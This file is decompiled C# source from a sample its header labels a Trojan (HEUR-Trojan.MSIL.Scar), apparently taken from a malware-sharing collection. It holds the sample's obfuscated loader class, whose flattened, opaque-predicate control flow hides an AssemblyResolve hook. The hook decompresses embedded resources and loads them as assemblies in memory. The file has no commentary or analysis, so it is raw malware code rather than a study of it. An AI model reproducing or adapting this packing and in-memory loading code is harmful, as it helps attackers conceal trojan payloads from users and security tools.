// Decompiled with JetBrains decompiler
// Type: Arrznfhcz.Adapter.Method
// Assembly: ConsoleApp13, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B655A79A-67BF-4D11-3C9F-30AAF7B05A65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scar.gen-9cde0d9eb4a1bd5801ecea6dca2b0883ce6136a99ec76c4e9dbcbbf06f186f49.exe

using Arrznfhcz.Objects;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Arrznfhcz.Adapter
{
  internal static class Method
  {
    private static object m_Bridge = new object();
    private static Dictionary<string, bool> factory = new Dictionary<string, bool>();
    private static Dictionary<string, string> _Configuration;
    private static Dictionary<string, string> m_Stub;
    private static int val;
    internal static Method ComputeClass;

    static Method()
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_3;
          case 2:
            Method._Configuration = new Dictionary<string, string>();
            Method.m_Stub = new Dictionary<string, string>();
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8b8077f557054a4ab05eaafebde5d335 == 0)
            {
              num1 = 0;
              continue;
            }
            break;
          default:
            Method._Configuration.Add((string) Method.RestartClass(1501420244), Publisher.ManageObserver(1501420263));
            Method._Configuration.Add(Publisher.ManageObserver(1501420038), Publisher.ManageObserver(1501420052));
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_da40be43f0044659847cb314b955d255 == 0)
            {
              num1 = 1;
              continue;
            }
            break;
        }
        int num2;
        num1 = num2;
      }
label_3:;
    }

    private static string InstantiateObserver(CultureInfo res) => res == null ? string.Empty : res.Name;

    private static Assembly TestObserver(AssemblyName setup)
    {
      Assembly[] assemblyArray = (Assembly[]) Method.AssetClass((object) AppDomain.CurrentDomain);
      int index = 0;
label_6:
      while (index < assemblyArray.Length)
      {
        Assembly assembly = assemblyArray[index];
        int num1 = 3;
        while (true)
        {
          AssemblyName name;
          switch (num1)
          {
            case 1:
              goto label_4;
            case 2:
              if (string.Equals((string) Method.InterruptClass((object) name), (string) Method.InterruptClass((object) setup), StringComparison.InvariantCultureIgnoreCase))
                goto default;
              else
                goto label_5;
            case 3:
              name = assembly.GetName();
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_376cd90bc67442b2a023c2fa5704acea != 0)
              {
                num1 = 2;
                continue;
              }
              break;
            case 4:
              goto label_6;
            default:
              if (Method.OrderClass(Method.DisableClass((object) name.CultureInfo), Method.DisableClass(Method.InitClass((object) setup)), StringComparison.InvariantCultureIgnoreCase))
              {
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_97cc72da7ae64d778adfa50a6ec06bdf != 0)
                {
                  num1 = 1;
                  continue;
                }
                break;
              }
              goto label_5;
          }
label_1:
          int num2;
          num1 = num2;
          continue;
label_5:
          ++index;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_978b11593bae4798902b5b1b913ccb2f != 0)
            num1 = 4;
          else
            goto label_1;
        }
label_4:
        return assembly;
      }
      return (Assembly) null;
    }

    private static void IncludeObserver(Stream key, Stream ord)
    {
      int num1 = 1;
      byte[] numArray;
      while (true)
      {
        switch (num1)
        {
          case 1:
            numArray = new byte[81920];
            num1 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_88f06c97e7454922b8d0bab1b36aede1 != 0 ? 0 : 0;
            continue;
          case 2:
            goto label_6;
          default:
            goto label_5;
        }
      }
label_6:
      return;
label_5:
      int num2;
      while ((num2 = Method.SetupClass((object) key, (object) numArray, 0, numArray.Length)) != 0)
        Method.ExcludeClass((object) ord, (object) numArray, 0, num2);
    }

    private static Stream CalcObserver(string last)
    {
      Assembly assembly = (Assembly) Method.RemoveClass();
      if (!last.EndsWith((string) Method.RestartClass(1501420078)))
        return (Stream) Method.CalculateClass((object) assembly, (object) last);
      int num1 = 0;
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_beca8b8d44734b91b46a32b91c7227f2 != 0)
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      Stream manifestResourceStream;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_7;
          default:
            manifestResourceStream = assembly.GetManifestResourceStream(last);
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1178b91411354c74a137f21a4ff5296b == 0)
            {
              num1 = 1;
              continue;
            }
            goto label_1;
        }
      }
label_7:
      try
      {
        DeflateStream deflateStream = new DeflateStream(manifestResourceStream, CompressionMode.Decompress);
        try
        {
          MemoryStream memoryStream = new MemoryStream();
          Method.MoveClass((object) deflateStream, (object) memoryStream);
          int num3 = 1;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_2fc66c954bc24c72a49f6026ed9aea3d == 0)
            goto label_11;
label_9:
          while (true)
          {
            switch (num3)
            {
              case 1:
                Method.PushClass((object) memoryStream, 0L);
                int num4;
                num3 = \u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_ad654c0db05344b8a3d71d50373a60af == 0 ? 0 : num4;
                continue;
              default:
                goto label_10;
            }
          }
label_10:
          return (Stream) memoryStream;
label_11:
          num3 = 1;
          goto label_9;
        }
        finally
        {
          Method.RegisterClass((object) deflateStream);
        }
      }
      finally
      {
        if (manifestResourceStream != null)
        {
          manifestResourceStream.Dispose();
          int num5 = 0;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_2d15588b97144c0084b14d0e75f5af41 != 0)
            goto label_17;
label_15:
          switch (num5)
          {
            default:
              goto label_18;
          }
label_17:
          num5 = 0;
          goto label_15;
        }
label_18:;
      }
    }

    private static Stream GetObserver(Dictionary<string, string> ident, string col)
    {
      string last;
      return ident.TryGetValue(col, out last) ? Method.CalcObserver(last) : (Stream) null;
    }

    private static byte[] SetupObserver(Stream init)
    {
      byte[] numArray = new byte[init.Length];
      Method.SetupClass((object) init, (object) numArray, 0, numArray.Length);
      int num = 0;
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1178b91411354c74a137f21a4ff5296b == 0)
        goto label_3;
label_1:
      switch (num)
      {
        default:
          return numArray;
      }
label_3:
      num = 0;
      goto label_1;
    }

    private static Assembly InsertObserver(
      Dictionary<string, string> key,
      Dictionary<string, string> result,
      AssemblyName temp)
    {
      string col = temp.Name.ToLowerInvariant();
      if (temp.CultureInfo != null && !string.IsNullOrEmpty(temp.CultureInfo.Name))
        col = temp.CultureInfo.Name + Publisher.ManageObserver(1501420088) + col;
      byte[] rawAssembly;
      using (Stream observer = Method.GetObserver(key, col))
      {
        if (observer == null)
          return (Assembly) null;
        rawAssembly = Method.SetupObserver(observer);
      }
      using (Stream observer = Method.GetObserver(result, col))
      {
        if (observer != null)
        {
          byte[] rawSymbolStore = Method.SetupObserver(observer);
          return Assembly.Load(rawAssembly, rawSymbolStore);
        }
      }
      return Assembly.Load(rawAssembly);
    }

    public static Assembly PrintObserver(object item, ResolveEventArgs ivk)
    {
      object bridge = Method.m_Bridge;
      bool lockTaken = false;
      try
      {
        Monitor.Enter(bridge, ref lockTaken);
        if (Method.factory.ContainsKey((string) Method.DeleteClass((object) ivk)))
        {
          int num1 = 0;
          if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_e40294d60c44452db75c0716bb655934 != 0)
            goto label_21;
label_18:
          switch (num1)
          {
            case 1:
              goto label_26;
            default:
              return (Assembly) null;
          }
label_21:
          int num2;
          num1 = num2;
          goto label_18;
        }
      }
      finally
      {
        if (lockTaken)
          Method.SearchClass(bridge);
      }
label_26:
      AssemblyName assemblyName = new AssemblyName((string) Method.DeleteClass((object) ivk));
      Assembly assembly = Method.TestObserver(assemblyName);
      if (!Method.PostClass((object) assembly, (object) null))
        goto label_29;
      else
        goto label_30;
label_1:
      int num3;
      int num4 = num3;
label_2:
      while (true)
      {
        switch (num4)
        {
          case 1:
            goto label_26;
          case 2:
            goto label_28;
          case 3:
label_16:
            if ((assemblyName.Flags & AssemblyNameFlags.Retargetable) != AssemblyNameFlags.None)
            {
              assembly = (Assembly) Method.DefineClass((object) assemblyName);
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_898c0605ac9640458e59804baf843842 != 0)
              {
                num4 = 4;
                continue;
              }
              goto label_1;
            }
            else
              goto label_14;
          case 4:
            goto label_14;
          case 5:
            lockTaken = false;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_81da3287fe4c4e5e892ec490acfbe096 != 0)
            {
              num4 = 0;
              continue;
            }
            goto label_1;
          case 6:
            bridge = Method.m_Bridge;
            if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1a9165bc47b146a3a99d568e1f5c7310 != 0)
            {
              num4 = 5;
              continue;
            }
            goto label_1;
          default:
            try
            {
              Monitor.Enter(bridge, ref lockTaken);
              int num5 = 0;
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_1464ce7d6536464f932ac058cb77ec1f == 0)
                num5 = 0;
              switch (num5)
              {
                default:
                  Method.factory[ivk.Name] = true;
                  goto label_16;
              }
            }
            finally
            {
              if (lockTaken)
              {
                Method.SearchClass(bridge);
                int num6 = 0;
                if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_8b8077f557054a4ab05eaafebde5d335 == 0)
                  goto label_11;
label_9:
                switch (num6)
                {
                  default:
                    goto label_12;
                }
label_11:
                num6 = 0;
                goto label_9;
              }
label_12:;
            }
        }
      }
label_28:
      return assembly;
label_14:
      return assembly;
label_29:
      assembly = Method.InsertObserver(Method._Configuration, Method.m_Stub, assemblyName);
      if (Method.AddClass((object) assembly, (object) null))
      {
        num4 = 6;
        goto label_2;
      }
      else
        goto label_14;
label_30:
      if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_c8f2d4ff88384267bb490ff9207638e0 != 0)
      {
        num4 = 2;
        goto label_2;
      }
      else
        goto label_1;
    }

    public static void CountObserver()
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            if (Interlocked.Exchange(ref Method.val, 1) == 1)
            {
              if (\u003CModule\u003E\u007B8b424ab4\u002Da97a\u002D41ed\u002Da8d8\u002D6d766d23a121\u007D.m_5e44441515b64910b83390b1e3b9c6cb == 0)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_7;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      ((AppDomain) Method.UpdateClass()).AssemblyResolve += new ResolveEventHandler(Method.PrintObserver);
    }

    internal static object RestartClass(int res_ID) => (object) Publisher.ManageObserver(res_ID);

    internal static bool DestroyClass() => Method.ComputeClass == null;

    internal static Method RunClass() => Method.ComputeClass;

    internal static object AssetClass([In] object obj0) => (object) ((AppDomain) obj0).GetAssemblies();

    internal static object InterruptClass([In] object obj0) => (object) ((AssemblyName) obj0).Name;

    internal static object DisableClass([In] object obj0) => (object) Method.InstantiateObserver((CultureInfo) obj0);

    internal static object InitClass([In] object obj0) => (object) ((AssemblyName) obj0).CultureInfo;

    internal static bool OrderClass([In] object obj0, [In] object obj1, [In] StringComparison obj2) => string.Equals((string) obj0, (string) obj1, obj2);

    internal static void ExcludeClass([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Write((byte[]) obj1, obj2, obj3);

    internal static int SetupClass([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3) => ((Stream) obj0).Read((byte[]) obj1, obj2, obj3);

    internal static object RemoveClass() => (object) Assembly.GetExecutingAssembly();

    internal static void MoveClass([In] object obj0, [In] object obj1) => Method.IncludeObserver((Stream) obj0, (Stream) obj1);

    internal static void PushClass([In] object obj0, [In] long obj1) => ((Stream) obj0).Position = obj1;

    internal static void RegisterClass([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static object CalculateClass([In] object obj0, [In] object obj1) => (object) ((Assembly) obj0).GetManifestResourceStream((string) obj1);

    internal static object DeleteClass([In] object obj0) => (object) ((ResolveEventArgs) obj0).Name;

    internal static void SearchClass([In] object obj0) => Monitor.Exit(obj0);

    internal static bool PostClass([In] object obj0, [In] object obj1) => (Assembly) obj0 != (Assembly) obj1;

    internal static bool AddClass([In] object obj0, [In] object obj1) => (Assembly) obj0 == (Assembly) obj1;

    internal static object DefineClass([In] object obj0) => (object) Assembly.Load((AssemblyName) obj0);

    internal static object UpdateClass() => (object) AppDomain.CurrentDomain;
  }
}
